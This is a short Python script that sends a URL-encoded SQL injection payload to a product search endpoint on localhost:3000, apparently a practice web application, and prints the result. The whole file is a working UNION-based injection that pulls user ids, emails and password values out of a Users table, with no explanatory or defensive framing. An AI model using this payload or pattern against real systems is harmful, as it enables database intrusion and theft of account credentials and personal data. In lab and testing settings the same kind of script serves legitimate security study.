import urllib.request
import urllib.parse
import json

payload = "apple')) UNION SELECT null,id,email,password,null,null,null,null,null FROM Users--"
encoded_payload = urllib.parse.quote(payload)
url = "http://localhost:3000/rest/products/search?q=" + encoded_payload

try:
    response = urllib.request.urlopen(url)
    data = response.read().decode('utf-8')
    print(data)
except Exception as e:
    print(e)
